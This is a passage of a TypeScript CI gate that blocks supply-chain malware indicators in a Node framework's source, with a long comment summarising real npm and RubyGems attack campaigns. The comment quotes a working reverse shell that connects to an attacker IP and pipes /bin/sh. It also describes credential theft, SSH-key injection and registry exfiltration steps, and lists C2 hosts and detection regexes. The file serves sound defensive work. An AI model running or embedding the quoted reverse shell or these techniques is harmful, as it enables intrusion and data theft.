/**
 * Registry-exfiltration / TLS-bypass / credential-injection CI gate
 * (Socket GemStuffer class).
 *
 * Socket's 2026-05-13 write-up
 * (https://socket.dev/blog/gemstuffer) documents the **GemStuffer**
 * campaign, in which a malicious Ruby script — using only the standard
 * library — exfiltrated scraped data by building a `.gem` archive in
 * `/tmp`, fabricating a credential file under a `HOME` override, and
 * publishing the archive directly to `rubygems.org/api/v1/gems` via a
 * hard-coded API key. SSL certificate verification was disabled to
 * suppress cert errors during the scraping phase. Variants that didn't
 * even shell out to `gem push` built the request by hand with
 * `Net::HTTP::Post`, defeating any "no shell-out" gate by staying inside
 * a single Ruby process.
 *
 * The same technique translates verbatim to a malicious Node package
 * that uses only `node:fs`, `node:os`, and the global `fetch`:
 *
 *   1. **TLS verification bypass** to scrape internal or victim-side
 *      endpoints without cert warnings —
 *      `process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0"`, or an
 *      `https.Agent({ rejectUnauthorized: false })`, or a `fetch` /
 *      `tls.connect` option of `rejectUnauthorized: false`.
 *   2. **`HOME` / npm-credential-file mutation** to inject a publish
 *      token into a fabricated home directory and then run `npm publish`
 *      / `pnpm publish` (already blocked by `verify-no-remote-exec`'s
 *      `child_process` ban) OR to leak a token from the consumer's real
 *      `~/.npmrc` by reading `os.homedir() + "/.npmrc"`.
 *   3. **Direct POST to a package-registry publish endpoint** — the
 *      "skip-the-CLI" GemStuffer variant translated to Node would
 *      construct a `fetch("https://registry.npmjs.org/-/npm/v1/...",
 *      { method: "POST", body: tarball })` (or the equivalent for
 *      RubyGems, PyPI, crates.io, Hex.pm) inside the runtime source
 *      itself. No `child_process` is needed; the entire exfil pipeline
 *      runs inside one Node process using only stdlib + global `fetch`.
 *
 * Daloy's runtime source (`src/**`) MUST NOT do any of the above. This
 * gate refuses to merge a PR that adds:
 *
 *   - `rejectUnauthorized: false` (any object-literal property
 *     assigning the literal `false` to `rejectUnauthorized`) — used by
 *     `https`, `tls`, `node-fetch`, `undici`, etc.
 *   - `NODE_TLS_REJECT_UNAUTHORIZED` as an environment-variable mutation
 *     target (`process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0"`).
 *   - `process.env.HOME = ...` mutation (GemStuffer's HOME redirect).
 *   - String literals referencing the publish path of any major package
 *     registry: `registry.npmjs.org/-/npm/v1/...`, `rubygems.org/api/v1`,
 *     `upload.pypi.org`, `crates.io/api/v1/crates/new`, `hex.pm/api/...`.
 *   - Reads of `~/.npmrc`, `~/.yarnrc`, `~/.netrc`, `~/.gem/credentials`
 *     (host credential files the malicious package would slurp).
 *
 * This gate is the regression net for the GemStuffer attack class.
 * Combined with `verify-no-remote-exec` (no `child_process` / no `vm` /
 * no `eval` / no `new Function` / no remote dynamic `import`), a
 * malicious republish of `@daloyjs/core` has no in-process exfiltration
 * channel: it cannot shell out to `npm publish`, it cannot fetch an
 * internal endpoint with cert verification disabled, and it cannot POST
 * a tarball to a registry endpoint directly from runtime code.
 *
 * Exit code:
 *   0 — no forbidden primitives found in `src/**`.
 *   1 — at least one was found; offending lines printed to stderr.
 *
 * ---
 *
 * **RATatouille / rand-user-agent extension (Aikido 2025-05-06, since 0.34.0):**
 * https://www.aikido.dev/blog/catching-a-rat-remote-access-trojian-rand-user-agent-supply-chain-compromise
 *
 * The malicious `rand-user-agent@{1.0.110, 2.0.83, 2.0.84}` publishes hid a
 * Remote Access Trojan inside `dist/index.js` whose decoded payload used
 * four pieces of tradecraft that don't trip the upstream `child_process` /
 * `vm` / `eval` / `new Function` / TLS-bypass gates:
 *
 *   1. `global['r'] = require` then `const c = global.r; c('child_process')`
 *      — aliased-require to bypass static `require('child_process')`
 *      regex detection.
 *   2. `module.paths.push(path.join(os.homedir(), '.node_modules',
 *      'node_modules'))` — manual NODE_PATH injection so the malware
 *      could `require('axios')` / `require('socket.io-client')` after
 *      side-installing them into a hidden `~/.node_modules` directory.
 *   3. A leading-dot `~/.node_modules` hidden install dir — never used
 *      by legitimate Node tooling (real `node_modules` has no leading
 *      dot) and a clean IOC.
 *   4. Hard-coded raw-IPv4 `http://` / `ws://` C2 URLs (the documented
 *      RATatouille C2 was `http://85.239.62.36:3306` for socket.io and
 *      `http://85.239.62.36:27017/u/f` for file exfil).
 *
 * Daloy's runtime source MUST NOT do any of these. Combined with the
 * existing `verify-no-remote-exec` ban on `child_process` / `vm` /
 * `eval` / `new Function` / remote dynamic `import()`, a malicious
 * republish of `@daloyjs/core` has no in-process channel left to land
 * a RATatouille-shape RAT — the aliased-require trick is moot when
 * there's no `child_process` to call through it, and side-loading a
 * fetched `axios` is moot when there's no `.node_modules` path
 * injection to make it resolvable.
 *
 * ---
 *
 * **Telegram-bot SSH-backdoor extension (Socket 2025-04-18):**
 * https://socket.dev/blog/npm-malware-targets-telegram-bot-developers
 *
 * Three typosquatted npm packages (`node-telegram-utils`,
 * `node-telegram-bots-api`, `node-telegram-util`) impersonated the
 * legitimate `node-telegram-bot-api` and, on Linux only, called an
 * `addBotId()` routine from the library constructor that:
 *
 *   1. `fs.mkdirSync(path.join(os.homedir(), ".ssh"), { mode: 0o700 })`
 *      and `fs.appendFileSync(path.join(os.homedir(),
 *      ".ssh/authorized_keys"), publicKey)` — wrote two attacker SSH
 *      public keys into the consumer's `~/.ssh/authorized_keys`,
 *      granting persistent passwordless SSH login that survives
 *      uninstalling the package.
 *   2. `https.get("https://ipinfo.io/ip", ...)` — used a public
 *      IP-discovery endpoint to fingerprint the victim's external IP
 *      address as a DNS-less host-mapping step.
 *   3. `https.get("https://solana.validator.blog/v1/check?ip=" + ip +
 *      "&name=" + os.userInfo().username)` — POSTed the external IP
 *      and Unix username to a registered C2 domain disguised as a
 *      Solana validator analytics host, confirming the compromise.
 *
 * None of these primitives touch `child_process`, `vm`, `eval`,
 * `new Function`, or a remote `import()`, so the upstream
 * `verify-no-remote-exec` gate does NOT see them. They also don't
 * disable TLS or mutate HOME, so the upstream GemStuffer-class gates
 * above don't see them either. Daloy's runtime source has no
 * legitimate reason to ever touch `~/.ssh/`, `authorized_keys`,
 * `ipinfo.io/ip` (or its peers `icanhazip.com` / `ifconfig.me` /
 * `api.ipify.org` / `checkip.amazonaws.com`), or the documented
 * `solana.validator.blog` C2 host, so this gate refuses each as a
 * bare-literal IOC. Combined with `minimum-release-age=1440` and
 * `ignore-scripts=true` (which keep the typosquats from running on
 * `pnpm install`) and `verify-no-runtime-deps` (which keeps `@daloyjs/core`
 * at zero runtime deps, so a typosquat of one of our transitive deps
 * cannot exist), a malicious republish of `@daloyjs/core` itself has
 * no channel left to drop in an `addBotId()`-shape SSH-key-injection
 * backdoor.
 *
 * ---
 *
 * **Advcash / `@naderabdi/merchant-advcash` reverse-shell extension
 * (Socket 2025-04-14,
 * https://socket.dev/blog/npm-package-advcash-integration-triggers-reverse-shell):**
 *
 * The malicious `@naderabdi/merchant-advcash` package posed as a
 * legitimate Advcash payment-gateway integration (with believable
 * SHA-256 hashing, request validation, currency checks, and
 * `url_success(req, res)` callback wiring) but hid a self-executing
 * reverse shell at the top of the success callback:
 *
 *   ```js
 *   (function(){
 *     var net = require("net"),
 *         cp  = require("child_process"),
 *         sh  = cp.spawn("/bin/sh", []);
 *     var client = new net.Socket();
 *     client.connect(8443, "65.109.184.223", function(){
 *       client.pipe(sh.stdin);
 *       sh.stdout.pipe(client);
 *       sh.stderr.pipe(client);
 *     });
 *     return /a/; // suppress crash
 *   })();
 *   ```
 *
 * The payload only detonates AT RUNTIME during a successful payment
 * (not at install or import), which lets it evade install-time
 * scanners and `ignore-scripts=true` cooldown gates. The
 * upstream `verify-no-remote-exec` ban on `child_process` already
 * stops the `cp.spawn("/bin/sh", ...)` half of this in `src/**`, and
 * `verify-no-registry-exfiltration`'s raw-IPv4-URL gate catches an
 * `http://65.109.184.223:8443/...` C2 URL — but the Advcash variant
 * dials TCP directly via `client.connect(8443, "65.109.184.223")`,
 * so the IOC IP appears as a **bare literal** rather than inside an
 * `http(s)://` URL. This gate adds two belt-and-braces literals:
 *
 *   1. The bare IOC IP `65.109.184.223`, mirroring the
 *      `85.239.62.36` (RATatouille) bare-literal IOC.
 *   2. The reverse-shell shell prefixes `/bin/sh`, `/bin/bash`,
 *      `/bin/zsh`, and the Windows `cmd.exe` shell — none of which
 *      have any legitimate use as a string literal inside Daloy's
 *      TypeScript/JavaScript runtime source. Even if a future
 *      `child_process` ban bypass landed (e.g. an
 *      `eval`-from-base64 trick that reconstructs `"child_process"`
 *      at runtime), a `spawn("/bin/sh", ...)`-shape reverse shell
 *      would still need the shell name as a literal somewhere — and
 *      this gate refuses that.
 *
 * ---
 *
 * **`xlsx-to-json-lh` remote-trigger codebase-wiper campaign (Socket
 * 2025-05-30,
 * https://socket.dev/blog/npm-package-wipes-codebases-with-remote-trigger):**
 *
 * The malicious `xlsx-to-json-lh` package typosquatted the legitimate
 * `xlsx-to-json-lc` Excel-to-JSON converter (one-letter substitution,
 * `lc` → `lh`) and embedded a working conversion function alongside a
 * hidden payload at `libs/support/index.js` that immediately opened a
 * persistent socket.io WebSocket to
 * `https://informer-server.herokuapp.com` on `require()`. The C2
 * channel waited for a message of shape `{ type: "remise à zéro" }`
 * (French for "reset to zero") and, on receipt, walked back from
 * `__dirname` through `node_modules` to the consumer project root and
 * called `rmDir(projectRoot)` to recursively delete the entire
 * project — source, `.git/`, `node_modules`, configs, assets — then
 * `socket.emit("message", { type: "removed-successfully" })` to
 * confirm destruction. Recovery without external backups is
 * impossible.
 *
 * The end-to-end defense for this attack class is layered:
 *
 *   - **Typosquatting**: `verify-known-dep-names` (explicit allowlist
 *     of every top-level dep in the workspace) makes
 *     `pnpm add xlsx-to-json-lh` fail in the same PR that introduces
 *     it, even after the 24h `minimum-release-age=1440` cooldown.
 *   - **Zero runtime deps**: `verify-no-runtime-deps` keeps
 *     `@daloyjs/core` at zero runtime deps so a typosquat of one of
 *     our transitive deps cannot exist.
 *   - **Install-time silence**: `ignore-scripts=true` +
 *     `verify-no-lifecycle-scripts` ensure even an installed
 *     typosquat cannot run on `pnpm install`.
 *   - **No C2 channel from core**: this gate refuses the documented
 *     `informer-server.herokuapp.com` C2 host literal AND the
 *     `remise à zéro` French trigger phrase as bare-literal IOCs.
 *     The trigger phrase is rare enough in legitimate prose that
 *     a hard-literal match in `src/**` is a high-signal indicator.
 *   - **No wiper primitive in core**: this gate also refuses every
 *     destructive filesystem-deletion API call
 *     (`rmSync`, `rmdirSync`, `unlinkSync`, `fs.rm(`, `fs.rmdir(`,
 *     `fs.unlink(`, and the `node:fs/promises` peers). A backend
 *     HTTP framework's runtime source has zero legitimate reason
 *     to delete a file or directory tree — combined with the
 *     `verify-no-remote-exec` ban on `child_process` / `vm` /
 *     `eval` / `new Function` / remote `import()`, there is no
 *     in-process channel left for a wiper to land in
 *     `@daloyjs/core`.
 *
 * ---
 *
 * **Vietnam-Telegram-ban Fastlane typosquat campaign (Socket
 * 2025-06-03,
 * https://socket.dev/blog/malicious-ruby-gems-exfiltrate-telegram-tokens-and-messages-following-vietnam-ban):**
 *
 * Two malicious RubyGems (`fastlane-plugin-telegram-proxy`,
 * `fastlane-plugin-proxy_teleram`) cloned the legitimate
 * `fastlane-plugin-telegram` plugin near-verbatim and changed a
 * single line: the Telegram Bot API endpoint
 * `https://api.telegram.org/bot{token}/sendMessage` was replaced
 * with a hard-coded Cloudflare Worker C2 at
 * `https://rough-breeze-0c37.buidanhnam95.workers.dev/bot{token}/sendMessage`.
 * Every Telegram message, bot token, chat ID, and uploaded file
 * routed through the relay was silently captured. The lure was
 * timed to Vietnam's nationwide May 21 2025 Telegram block so
 * developers searching for proxies would adopt the typosquats.
 *
 * The attack class is RubyGems / Fastlane and lands outside Daloy's
 * ecosystem, but the **endpoint-substitution + opaque-Cloudflare-Worker-relay
 * tradecraft** translates directly to npm: a malicious republish of
 * `@daloyjs/core` could insert one hardcoded
 * `https://<random>.workers.dev/...` URL as a proxy for any API call
 * and exfiltrate request bodies through an attacker-controlled
 * Worker. Cloudflare Worker source is not publicly visible, so the
 * relay is opaque by design.
 *
 * Daloy core's runtime source never calls any third-party API, so
 * any URL-shaped `https://<sub>.workers.dev/...` literal in `src/**`
 * is presumptively a C2 relay. This gate refuses:
 *
 *   - The documented exact-host IOC
 *     `rough-breeze-0c37.buidanhnam95.workers.dev` (kept as a
 *     bare-literal IOC for grep parity with prior campaign blocks).
 *   - Any URL-shaped Cloudflare Worker host literal
 *     `https?://<at-least-one-sub>.workers.dev/...` — Daloy core
 *     legitimately mentions the bare `workers.dev` PSL suffix in
 *     `src/subdomains.ts` (a Public Suffix List entry, not a URL),
 *     so the gate is scoped to URL-shaped occurrences only and the
 *     existing PSL entry continues to pass.
 *
 * ---
 *
 * **`@crypto-exploit` BSC/Ethereum wallet-drainer campaign (Socket
 * 2025-06-02,
 * https://socket.dev/blog/malicious-npm-packages-target-bsc-and-ethereum):**
 *
 * Four malicious npm packages
 * (`pancake_uniswap_validators_utils_snipe`,
 * `pancakeswap-oracle-prediction`, `ethereum-smart-contract`,
 * `env-process` — the last typosquats the legitimate `process`
 * browser-shim) collectively pulled ~2,100 downloads. Each package
 * required `web3`, read `process.env.YOUR_ACCOUNT_ADDRESS` and
 * `process.env.YOUR_ACCOUNT_PRIVATE_KEY` from the victim's environment,
 * built a transaction transferring 80–85 % of the wallet's balance
 * to the hardcoded attacker address
 * `0x71448ec2D9c5fC4978F5A690D5CE11A8669C9D02`, signed it via
 * `web3.eth.accounts.signTransaction(...)`, and broadcast it via
 * `web3.eth.sendSignedTransaction(...)`. RPC endpoints alternated
 * between BSC (`https://bsc-dataseed1.defibit.io/`) and Ethereum
 * (`https://cloudflare-eth.com/`). None of the primitives touch
 * `child_process`, `vm`, `eval`, `new Function`, dynamic remote
 * `import()`, TLS bypass, `HOME` mutation, raw-IPv4 URLs, or a
 * postinstall hook — the entire drain runs at first `require()` of
 * the malicious package using only the `web3` SDK and stdlib.
 *
 * `@daloyjs/core` is a backend HTTP framework with zero runtime
 * dependencies (`pnpm verify:no-runtime-deps`) and never signs or
 * broadcasts blockchain transactions from `src/**`. Any of the
 * following in runtime source is a hard IOC of this attack class:
 *
 *   - The exact attacker wallet address
 *     `0x71448ec2D9c5fC4978F5A690D5CE11A8669C9D02` as a bare literal.
 *   - A web3-SDK transaction-signing primitive
 *     (`eth.accounts.signTransaction(...)`) — the in-process key-use
 *     step the drainer needs to authorize the outbound transfer.
 *   - A web3-SDK signed-transaction broadcast primitive
 *     (`eth.sendSignedTransaction(...)`) — the on-chain submission
 *     step that actually drains the wallet.
 *
 * Combined with `ignore-scripts=true` (blocks the easier postinstall
 * channel), `minimum-release-age=1440` (24 h cooldown closes the
 * first-day install window), `verify-no-runtime-deps` (zero runtime
 * deps means no `web3` can ride in transitively through us), and
 * `verify-known-dep-names` (any direct addition of `web3` or one of
 * the four flagged packages would fail the allowlist), a malicious
 * republish of `@daloyjs/core` has no in-process channel to land
 * the drainer.
 *
 * @since 0.50.0
 */

import { readdir, readFile, stat } from "node:fs/promises";
import { relative } from "node:path";

const SRC_ROOT = new URL("../src/", import.meta.url);

export interface ForbiddenRegistryExfilCall {
  readonly file: string;
  readonly line: number;
  readonly text: string;
  readonly reason: string;
}

interface ForbiddenPattern {
  readonly re: RegExp;
  readonly reason: string;
  /** When true the pattern is checked against the line WITH string literals
   *  intact (so host-name string matches still work). When false it is
   *  checked against the line with string literals stripped (so a doc
   *  string mentioning the pattern doesn't trip). */
  readonly keepStrings: boolean;
}

/**
 * Patterns that must NEVER appear in `src/**`. Documented inline against
 * the GemStuffer TTPs they would enable in a Node port of the attack.
 */
const FORBIDDEN_PATTERNS: readonly ForbiddenPattern[] = [
  // ---- TLS verification bypass (GemStuffer's `VERIFY_NONE`) ----
  {
    re: /\brejectUnauthorized\s*:\s*false\b/,
    reason:
      "`rejectUnauthorized: false` disables TLS certificate validation (GemStuffer-class VERIFY_NONE); " +
      "use the system CA bundle and a real hostname instead",
    keepStrings: false,
  },
  {
    re: /\bNODE_TLS_REJECT_UNAUTHORIZED\b/,
    reason:
      "`NODE_TLS_REJECT_UNAUTHORIZED` mutation disables TLS certificate validation " +
      "process-wide (GemStuffer-class VERIFY_NONE); never set this from library code",
    keepStrings: true,
  },
  // ---- HOME / credential-file mutation (GemStuffer's HOME override) ----
  {
    // `process.env.HOME =` (assignment, not read). Use a negative
    // lookahead for `==` / `===` so equality comparisons don't trip.
    re: /\bprocess\.env\.HOME\s*=(?!=)/,
    reason:
      "`process.env.HOME = ...` redirects the home directory and is the GemStuffer " +
      "credential-injection primitive; library code must never mutate HOME",
    keepStrings: false,
  },
  // ---- Direct POST to a package-registry publish endpoint ----
  // The full publish-path literals below are the actual exfiltration
  // endpoints — a runtime mention of any of them inside `src/**` is a
  // strong IOC of the "POST tarball to registry from inside the
  // process" variant. The bare host names (e.g. just `registry.npmjs.org`)
  // are NOT blocked — clients legitimately reference registry hosts in
  // user-facing docs / error messages — only the publish API paths.
  {
    re: /registry\.npmjs\.org\/-\/npm\/v1\//,
    reason:
      "npm publish-API path in source can exfiltrate data as a tarball POST (GemStuffer class); " +
      "Daloy never publishes from runtime — remove this string",
    keepStrings: true,
  },
  {
    re: /rubygems\.org\/api\/v1\/gems\b/,
    reason:
      "RubyGems publish-API path in source can exfiltrate data as a `.gem` POST (GemStuffer class); " +
      "Daloy never publishes from runtime — remove this string",
    keepStrings: true,
  },
  {
    re: /upload\.pypi\.org\/legacy/,
    reason:
      "PyPI publish-API path in source can exfiltrate data as a wheel POST (GemStuffer class); " +
      "Daloy never publishes from runtime — remove this string",
    keepStrings: true,
  },
  {
    re: /crates\.io\/api\/v1\/crates\/new\b/,
    reason:
      "crates.io publish-API path in source can exfiltrate data as a crate POST (GemStuffer class); " +
      "Daloy never publishes from runtime — remove this string",
    keepStrings: true,
  },
  // ---- Reads of host credential files ----
  {
    re: /\/\.npmrc\b/,
    reason:
      "library code must not reference `~/.npmrc`; GemStuffer-class attacks slurp host npm tokens " +
      "from the user's home directory",
    keepStrings: true,
  },
  {
    re: /\/\.yarnrc(?:\.yml)?\b/,
    reason:
      "library code must not reference `~/.yarnrc` / `~/.yarnrc.yml`; GemStuffer-class attacks slurp " +
      "host yarn tokens from the user's home directory",
    keepStrings: true,
  },
  {
    re: /\/\.netrc\b/,
    reason:
      "library code must not reference `~/.netrc`; GemStuffer-class attacks slurp host HTTP " +
      "credentials from the user's home directory",
    keepStrings: true,
  },
  {
    re: /\/\.gem\/credentials\b/,
    reason:
      "library code must not reference `~/.gem/credentials`; this is the exact path GemStuffer " +
      "writes a fabricated RubyGems token to",
    keepStrings: true,
  },
  // ---- Lazarus / Jade Sleet npm campaign (Socket 2023-07-25, GitHub
  //      security alert) — paired-package token handoff via
  //      `~/.vscode/jsontoken` and a typosquat C2 host. See
  //      https://socket.dev/blog/social-engineering-campaign-npm-malware
  //      and https://github.blog/2023-07-18-security-alert-social-engineering-campaign-targets-technology-industry-employees/ ----
  {
    // Catches `/.vscode/`, `\\.vscode\\` (Windows path literals), etc.
    // Daloy core has no business touching the user's IDE config dir;
    // the Jade Sleet "first package writes token, second package
    // reads token" handoff is staged at `$HOME/.vscode/jsontoken`.
    re: /[\\/]\.vscode[\\/]/,
    reason:
      "library code must not reference `~/.vscode/` — Daloy never touches the user's IDE config " +
      "directory, and `$HOME/.vscode/jsontoken` is the exact path the Lazarus / Jade Sleet paired-package " +
      "npm campaign uses to hand off a token between its first-stage and second-stage packages " +
      "(https://socket.dev/blog/social-engineering-campaign-npm-malware)",
    keepStrings: true,
  },
  {
    // `npmjsregister.com` is the documented C2 host the Lazarus / Jade
    // Sleet packages POST scraped data to (`/checkupdate.php`,
    // `/getupdate.php`). Any mention in `src/**` is a hard IOC.
    re: /\bnpmjsregister\.com\b/i,
    reason:
      "library code must not reference `npmjsregister.com` — this is the documented Lazarus / Jade " +
      "Sleet npm-campaign C2 host (typosquat of `registry.npmjs.org`) used for `/checkupdate.php` and " +
      "`/getupdate.php` exfiltration endpoints (https://socket.dev/blog/social-engineering-campaign-npm-malware)",
    keepStrings: true,
  },
  // ---- RATatouille / rand-user-agent supply-chain compromise
  //      (Aikido 2025-05-06, https://www.aikido.dev/blog/catching-a-rat-remote-access-trojian-rand-user-agent-supply-chain-compromise) ----
  {
    // Aliased-require: `global.r = require`, `global['r'] = require`,
    // `globalThis.r = require`. RATatouille used `global['r'] = require`
    // then `const c = global.r; c('child_process')` to bypass any
    // gate that grep'd for the literal `require('child_process')`.
    // Library code has no legitimate reason to hand `require` to a
    // global; the module-level binding is always in scope.
    // Note: `keepStrings: false` strips string literals to `""`, so the
    // bracket-key alt accepts `[""]` (zero chars between the quotes)
    // to match `global["r"] = require` after stripping.
    re: /\b(?:global|globalThis)\s*(?:\.\s*[A-Za-z_$][\w$]*|\[\s*["'][^"']*["']\s*\])\s*=\s*require\b/,
    reason:
      "aliased-require (`global.X = require`) is the RATatouille obfuscation trick used to bypass " +
      "static `require('child_process')` detection; library code must call `require` directly so " +
      "gates like `verify-no-remote-exec` can see the module name",
    keepStrings: false,
  },
  {
    // Manual NODE_PATH injection. RATatouille pushed
    // `path.join(homedir, '.node_modules', 'node_modules')` onto
    // `module.paths` so a side-installed malicious `axios` /
    // `socket.io-client` became resolvable. Daloy core never mutates
    // module-resolution paths at runtime.
    re: /\bmodule\s*\.\s*paths\s*\.\s*(?:push|unshift|splice|fill)\b/,
    reason:
      "`module.paths.push(...)` injects extra NODE_PATH entries at runtime; this is the RATatouille " +
      "primitive for side-loading a fetched `axios` / `socket.io-client` from a hidden home-directory " +
      "install dir, and Daloy core never does this",
    keepStrings: false,
  },
  {
    // Leading-dot `.node_modules` hidden install dir under $HOME.
    // Real `node_modules` has no leading dot — this is a clean RAT
    // IOC for the "hide deps in $HOME/.node_modules" pattern.
    re: /(?:^|["'`/\\\s(=,])\.node_modules\b/,
    reason:
      "`.node_modules` (with a leading dot) is the RATatouille hidden install dir under `$HOME` used " +
      "to stash a fetched `axios` / `socket.io-client` for the RAT; real Node `node_modules` has no " +
      "leading dot — library code must never reference this path",
    keepStrings: true,
  },
  {
    // Hard-coded raw-IPv4 host in an `http(s)://` or `ws(s)://` URL.
    // RATatouille's C2 was `http://85.239.62.36:3306` (socket.io) and
    // `http://85.239.62.36:27017/u/f` (file upload). Loopback (`127.x`),
    // unspecified-bind (`0.0.0.0`), and `localhost` are allow-listed.
    re: /\b(?:https?|wss?):\/\/(?!127\.|0\.0\.0\.0\b|localhost\b)\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/,
    reason:
      "raw-IPv4 `http(s)://` / `ws(s)://` URL in source is a DNS-less command-and-control IOC " +
      "(RATatouille used `http://85.239.62.36:3306`); use a real hostname (with TLS) or restrict " +
      "to `127.0.0.1` / `0.0.0.0` / `localhost`",
    keepStrings: true,
  },
  {
    // The documented RATatouille C2 IP literal, even when not in a URL
    // (e.g. stashed in a config variable for later string-concat into
    // a URL). Mirrors the npmjsregister.com IOC pattern above.
    re: /\b85\.239\.62\.36\b/,
    reason:
      "`85.239.62.36` is the documented RATatouille / rand-user-agent C2 host " +
      "(https://www.aikido.dev/blog/catching-a-rat-remote-access-trojian-rand-user-agent-supply-chain-compromise); " +
      "any reference in `src/**` is a hard IOC",
    keepStrings: true,
  },
  // ---- xrpl.js / Ripple SDK supply-chain compromise (Aikido 2025-04-22,
  //      https://www.aikido.dev/blog/xrp-supplychain-attack-official-npm-package-infected-with-crypto-stealing-backdoor) ----
  //
  // The hijacked npm token published five backdoored versions of the
  // official `xrpl` Ripple SDK (`xrpl@4.2.1`, `4.2.2`, `4.2.3`, `4.2.4`,
  // and `xrpl@2.14.2`, ~140k weekly downloads, ~2.9M monthly) that
  // shipped a `checkValidityOfSeed` function inside the runtime bundle
  // — it POSTed the user's XRP wallet seed / private key to
  // `https://0x9c.xyz`. None of the malicious code was ever mirrored
  // to the public GitHub repo (no tag, no PR, no CI run); it existed
  // only in the npm tarball. The exfiltration channel was a plain
  // global `fetch` to a registered domain, so the RATatouille raw-IPv4
  // gate above does NOT catch it on its own.
  {
    re: /\b0x9c\.xyz\b/i,
    reason:
      "`0x9c.xyz` is the documented exfiltration host for the xrpl.js / Ripple SDK supply-chain " +
      "compromise (April 2025) — the malicious `checkValidityOfSeed` function in `xrpl@2.14.2` and " +
      "`xrpl@4.2.1`–`4.2.4` POSTed wallet seeds to this domain " +
      "(https://www.aikido.dev/blog/xrp-supplychain-attack-official-npm-package-infected-with-crypto-stealing-backdoor); " +
      "any reference in `src/**` is a hard IOC",
    keepStrings: true,
  },
  // ---- Telegram-bot SSH-backdoor supply-chain compromise (Socket
  //      2025-04-18, https://socket.dev/blog/npm-malware-targets-telegram-bot-developers) ----
  //
  // The typosquatted `node-telegram-utils` / `node-telegram-bots-api` /
  // `node-telegram-util` packages injected attacker SSH public keys
  // into `~/.ssh/authorized_keys` and exfiltrated the victim's external
  // IP + Unix username to a registered C2 host disguised as a Solana
  // validator analytics endpoint. The primitives below are the
  // bare-literal IOCs; none have a legitimate use inside a web
  // framework's runtime source.
  {
    // The exact file the attack appends attacker SSH public keys to.
    // Daloy core has no legitimate reason to touch it.
    re: /\bauthorized_keys\b/,
    reason:
      "`authorized_keys` is the file the Telegram-bot SSH-backdoor class appends attacker-controlled " +
      "SSH public keys to in order to gain persistent passwordless SSH access to the consumer's host " +
      "(https://socket.dev/blog/npm-malware-targets-telegram-bot-developers); library code must never " +
      "reference this filename",
    keepStrings: true,
  },
  {
    // Reference to the user's `.ssh/` directory. Daloy never touches
    // it; the SSH-backdoor class mkdir's it to drop an
    // `authorized_keys` file when it doesn't exist yet.
    re: /[\\/]\.ssh[\\/]/,
    reason:
      "library code must not reference `~/.ssh/` — Daloy never touches the user's SSH key directory, " +
      "and the Telegram-bot SSH-backdoor class mkdirs this path to plant an `authorized_keys` file " +
      "for persistent passwordless remote login " +
      "(https://socket.dev/blog/npm-malware-targets-telegram-bot-developers)",
    keepStrings: true,
  },
  {
    // The documented Telegram-bot SSH-backdoor C2 host.
    re: /\bsolana\.validator\.blog\b/i,
    reason:
      "`solana.validator.blog` is the documented C2 host for the Telegram-bot SSH-backdoor npm " +
      "campaign (`node-telegram-utils` / `node-telegram-bots-api` / `node-telegram-util`); the " +
      "malicious `addBotId()` constructor routine POSTed the victim's external IP and Unix username " +
      "to `https://solana.validator.blog/v1/check?ip=…&name=…` " +
      "(https://socket.dev/blog/npm-malware-targets-telegram-bot-developers) — any reference in " +
      "`src/**` is a hard IOC",
    keepStrings: true,
  },
  {
    // Public IP-discovery endpoints. These are the DNS-less host
    // mapping primitives malicious packages use to fingerprint a
    // victim's external IP without resolving the C2 host directly.
    // `ipinfo.io/ip` was the documented Telegram-bot variant; the
    // `ipinfo.io/json` peer is what the 60-package Discord-webhook
    // reconnaissance campaign (Socket 2025-05-23,
    // https://socket.dev/blog/60-malicious-npm-packages-leak-network-and-host-data)
    // used to collect the victim's external IP/hostname/org before
    // POSTing the full host fingerprint to a Discord webhook. The peer
    // hosts below (`icanhazip.com`, `ifconfig.me`, `api.ipify.org`,
    // `checkip.amazonaws.com`) are the same tradecraft used by other
    // npm-malware campaigns. None of them have a legitimate use inside
    // a backend HTTP framework — a real Daloy app that needs the
    // client IP reads it from request headers, not a public lookup.
    re: /\bipinfo\.io\/(?:ip|json)\b/i,
    reason:
      "`ipinfo.io/ip` is the public IP-discovery endpoint the Telegram-bot SSH-backdoor class " +
      "fingerprinted victims with before exfiltrating to its C2 host " +
      "(https://socket.dev/blog/npm-malware-targets-telegram-bot-developers); the `ipinfo.io/json` " +
      "peer is what the 60-package Discord-webhook reconnaissance campaign " +
      "(https://socket.dev/blog/60-malicious-npm-packages-leak-network-and-host-data) used to " +
      "collect external IP/hostname/org before exfiltrating the host fingerprint; a backend HTTP " +
      "framework reads the client IP from request headers, never a public lookup — any reference " +
      "in `src/**` is a hard IOC",
    keepStrings: true,
  },
  {
    re: /\bicanhazip\.com\b/i,
    reason:
      "`icanhazip.com` is a public IP-discovery endpoint used by npm-malware campaigns to " +
      "fingerprint victims (Telegram-bot SSH-backdoor class, " +
      "https://socket.dev/blog/npm-malware-targets-telegram-bot-developers); a backend HTTP " +
      "framework reads the client IP from request headers, never a public lookup",
    keepStrings: true,
  },
  {
    re: /\bifconfig\.me\b/i,
    reason:
      "`ifconfig.me` is a public IP-discovery endpoint used by npm-malware campaigns to " +
      "fingerprint victims (Telegram-bot SSH-backdoor class, " +
      "https://socket.dev/blog/npm-malware-targets-telegram-bot-developers); a backend HTTP " +
      "framework reads the client IP from request headers, never a public lookup",
    keepStrings: true,
  },
  {
    re: /\bapi\.ipify\.org\b/i,
    reason:
      "`api.ipify.org` is a public IP-discovery endpoint used by npm-malware campaigns to " +
      "fingerprint victims (Telegram-bot SSH-backdoor class, " +
      "https://socket.dev/blog/npm-malware-targets-telegram-bot-developers); a backend HTTP " +
      "framework reads the client IP from request headers, never a public lookup",
    keepStrings: true,
  },
  {
    re: /\bcheckip\.amazonaws\.com\b/i,
    reason:
      "`checkip.amazonaws.com` is a public IP-discovery endpoint used by npm-malware campaigns to " +
      "fingerprint victims (Telegram-bot SSH-backdoor class, " +
      "https://socket.dev/blog/npm-malware-targets-telegram-bot-developers); a backend HTTP " +
      "framework reads the client IP from request headers, never a public lookup",
    keepStrings: true,
  },
  {
    // ---- 60-package Discord-webhook reconnaissance campaign
    //      (Socket 2025-05-23,
    //      https://socket.dev/blog/60-malicious-npm-packages-leak-network-and-host-data) ----
    //
    // Sixty malicious npm packages published under three throwaway
    // accounts (`bbbb335656`, `sdsds656565`, `cdsfdfafd1232436437`) ran
    // an install-time script that collected hostname, internal IP via
